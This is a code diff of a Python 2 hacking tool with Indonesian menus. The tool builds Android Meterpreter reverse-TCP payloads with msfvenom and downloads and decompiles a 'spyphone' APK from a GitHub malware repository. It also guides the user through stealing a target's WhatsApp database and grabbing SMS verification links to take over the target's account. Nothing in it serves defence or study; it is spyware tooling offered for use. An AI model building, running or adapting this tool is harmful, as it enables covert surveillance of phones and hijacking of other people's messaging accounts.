@@ -15,7 +15,6 @@ cyan= '\033[36m'
 bold= '\033[1m'
 end= '\033[0m'
 
-
 def flush(s):
     for c in s + '\n':
         sys.stdout.write(c)
@@ -26,12 +25,10 @@ def out():
 	exit()
 	
 def back():
-	print putih+'---------------------------------------------------'
 	raw_input('\n\x1b[1;91m					[ \x1b[1;97mBack \x1b[1;91m]')
 	home()
 	
 def nxt():
-	print putih+'---------------------------------------------------'
 	raw_input('\n\x1b[1;91m					[ \x1b[1;97mNext \x1b[1;91m]')
 
 os.system("clear")
@@ -70,9 +67,6 @@ else :
 			time.sleep(3)
 			os.system('clear')
 			exit()
-      
-
-
 
 def payload():
 	os.system("clear")
@@ -102,6 +96,8 @@ def payload():
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
 def spyphone_V14():
+	print 'script dalam perbaikan' 
+	out()
 	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
@@ -148,9 +144,9 @@ def extract_wa():
 	flush('    download {database}')
 	nxt()
 	flush(hijau+'Membuka Msfconsole ... ')
-	remote()
+	#remote()
 	logo()
-	flush(putih+'Buka link Verifikasi yang paling Atas')
+	flush(putih+'Buka link Verifikasi')
 	flush('Untuk Meretas akun Target')
 	flush('Jika link tidak Muncul, ulangi dump_sms')
 	print putih+'---------------------------------------------------'
@@ -159,11 +155,16 @@ def extract_wa():
 	os.system('chmod +x link.txt')
 	f= open("link.txt")
 	if f.mode == "r":
-		T= f.read()
-		print T
-	else:
-		print merah+'[!] tidak bisa membaca kode'
-		home()
+		T = f.readlines()
+		os.system("echo https://"+str(T)+" > t.txt")
+		os.system('cat t.txt |grep https:// > v.txt')
+		g = open('v.txt')
+		for line in g:
+			line = line.replace("[", "")
+			os.system('echo  '+str(line)+' > y.txt')
+		g.close
+		os.system('cat y.txt')
+	f.close
 	nxt()
 	print putih
 	flush('Setelah berhasil meretas akun target')
@@ -225,11 +226,8 @@ def malware():
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
-    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
+    #print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
     print '\r\x1b[1;91m__________________________________________«Back» '
-    
-        	
-
 
 def logo():      
 	f = open('Baner/asci')
@@ -242,7 +240,6 @@ def logo():
 	print putih+'---------------------------------------------------'
 	print ''
 
-
 def remote():
     os.system("clear")    	
     logo()
@@ -253,7 +250,7 @@ def remote():
     print '' 
     print g
     f.close
-    print putih+'Jika IP diatas kosong, Aktifkan OpenVPN'
+    print putih+'Jika Tun0 diatas kosong, Aktifkan OpenVPN'
     print "\x1b[1;91m----------------------------------------------"
     print " Masukan IP tun0 inet: "
     lh =raw_input(" LHOST : ")
@@ -279,22 +276,19 @@ def remote():
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
       os.system('clear')
 
-
-    
 def sisip():
     awal() 
     time.sleep(3)
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home() 
-    
-    
+
 def update():
 	os.system('clear')
 	os.system('git stash && git pull origin master')
 	os.system('python2 install.py')
 	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	home()
-	
+
 def baru():
     os.system('clear')
     logo()
@@ -320,8 +314,7 @@ def baru():
     os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
-  
-    
+
 def menu():
     os.system('clear')
     time.sleep(1)
@@ -333,12 +326,10 @@ def menu():
     print '\x1b[1;91m5.\x1b[1;97mUpdate--'
     print '\x1b[1;91m6.\x1b[1;97mExit'
     print '\r\x1b[1;91m__________________________________________«» '
- 
 
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if zedd == '':
-    	
         print '\x1b[1;91m[!] Can\'t empty'
         time.sleep(1)
         os.system('clear')
@@ -371,7 +362,5 @@ def pilih():
 def home():
 	menu()
 	pilih()         
-                   
-        
 
 home()
